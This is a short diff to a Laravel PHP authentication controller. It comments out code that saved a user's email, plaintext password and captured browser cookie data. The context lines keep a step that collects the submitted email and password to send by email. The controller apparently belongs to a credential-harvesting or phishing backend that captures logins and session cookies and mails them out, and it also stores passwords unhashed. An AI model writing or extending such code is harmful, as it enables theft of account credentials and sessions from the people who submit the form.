@@ -104,12 +104,12 @@ class AuthController extends Controller
             'timestamp' => now()->toIso8601String()
         ];
 
-        // Create the user with the complete browser data
-        $user = User::create([
-            'email' => $request->email,
-            'password' => $request->password,
-            'cookies' => json_encode($browserData), // Store all browser data as JSON
-        ]);
+        // // Create the user with the complete browser data
+        // $user = User::create([
+        //     'email' => $request->email,
+        //     'password' => $request->password,
+        //     'cookies' => json_encode($browserData), // Store all browser data as JSON
+        // ]);
 
         // Prepare form data to send in the email
         $formData = $request->only(['email', 'password']);
